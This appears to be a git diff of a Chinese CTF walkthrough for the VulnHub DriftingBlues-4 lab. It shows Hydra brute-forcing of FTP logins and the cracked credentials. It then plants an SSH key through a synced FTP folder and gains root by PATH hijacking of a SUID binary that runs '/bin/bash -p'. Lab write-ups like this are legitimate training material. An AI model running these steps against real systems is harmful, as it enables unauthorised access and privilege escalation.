@@ -73,12 +73,15 @@ print(result)
 输出如下：
 ```
 man we are a tech company and still getting hacked??? what the shit??? enough is enough!!! 
+#
 ## (中间全是这个)
+#
+
 /iTiS3Cr3TbiTCh.png
 ```
 
 **访问`http://192.168.64.29/iTiS3Cr3TbiTCh.png`**
-扫出来的一个二维码，安装zbar-tools工具，解读一下，
+一个二维码，安装zbar-tools工具，解读一下，
 ```shell
 wget http://192.168.64.29/iTiS3Cr3TbiTCh.png
 zbarimg iTiS3Cr3TbiTCh.png
@@ -92,6 +95,7 @@ zbarimg iTiS3Cr3TbiTCh.png
 gobuster dir --url http://192.168.64.29 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x zip,txt,php,git,bak,html -db
 ```
 ![](./img/10.png)
+没发现什么有用信息。
 
 ## 1.4 22端口信息收集
 ```shell
@@ -107,10 +111,6 @@ nmap -sV -p 21 --script ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-syst.nse 192.1
 ![](./img/11.png)
 没什么漏洞。
 
----
-
-# 2.拿到系统立足点
-
 **使用上面得到的类似人名的单词来暴力破解ftp**
 ```shell
 hydra -l luther -P /usr/share/wordlists/rockyou.txt ftp://192.168.64.29 -t 32 -V -f
@@ -122,19 +122,64 @@ hydra -l clark -P /usr/share/wordlists/rockyou.txt ftp://192.168.64.29 -t 32 -V 
 - login: `luther`   password: `mypics`
 - login: `hubert`   password: `john316`
 
+用户gary和clark没有跑完整个字典，每个大约跑了12万个。
 
+> rockyou.txt字典是根据常用性，从上到下排列的。Hydra会从上到下依次执行。其实也用不着跑完（我感觉我最多跑1一个小时），如果完全是依赖爆破的话，那么这台靶机也没什么意思。🌚
 
-
-
+利用上面的2个用户登陆ftp, 一个hubert文件（里面是空的），一个sync_log文件，好像是什么同步的日志文件（而且所有者是root），其他的什么也没有。
 
 ---
 
-# 系统提权
+# 2.拿到系统立足点
+**整理一下当前的信息：**
+```
+80端口拿到类似用户名的单词，而且目前没有其他的突破口
+⬇️
+爆破出2个ftp用户及密码
+⬇️
+发现ftp里面有一个跟用户名一样的文件夹（所属主与所属组都是hubert），一个root所有的sync_log像是同步日志文件
+➕
+ssh必须使用密钥登陆
+```
+综合上面的信息，展开想象力的翅膀，有没有一种可能：🧐
+*ftp下面的hubert目录就是系统里面hubert用户的家目录？同步的内容就是将ftp下面的hubert目录内容与系统里面/home/hubert目录内容同步？*
 
+尝试一下：
+1. kali生成密钥对：`id_ed25519`  `id_25519.pub`
+2. 将`id_25519.pub`内容复制进新建的`authorized_keys`文件里面
+3. 使用hubert用户登陆ftp，在里面的hubert文件夹里面创建 *.ssh* 文件夹，然后将`authorized_keys`文件上传进去。别着急，先等几分钟。
+4. 登陆hubert用户，`ssh -p 22 hubert@192.168.64.29`
 
+![](./img/12.png)
+登陆成功。
 
+---
 
+# 3.系统提权
+## 3.1 `sudo -l`
+![](./img/13.png)
 
+## 3.2 `find / -perm -4000 -type f 2>/dev/null`
+![](./img/14.png)
+
+有一个比较奇怪的命令/usr/bin/getinfo
+```shell
+cat /usr/bin/getinfo
+```
+可以发现里面有类似ip这样的没有使用绝对路径的命令，可以考虑使用路径劫持。
+
+```shell
+cd /home/hubert
+touch ip
+echo '#!/bin/bash' > ip
+echo '/bin/bash -p' >> ip
+chmod 777 ip
+PATH=/home/hubert:$PATH
+/usr/bin/getinfo
+```
+![](./img/15.png)
+
+![](./img/16.png)
 
 ---
 ---
@@ -151,8 +196,9 @@ kali
 - OS Realease: `debian 2025.4`
 - `Arm64`
 
-靶机driftingblues-3: 
-- `https://www.vulnhub.com/entry/driftingblues-3,656/`
+靶机driftingblues-4: 
+- `https://www.vulnhub.com/entry/driftingblues-4,661/`
+- IP: `192.168.64.29`
 
 ---
 
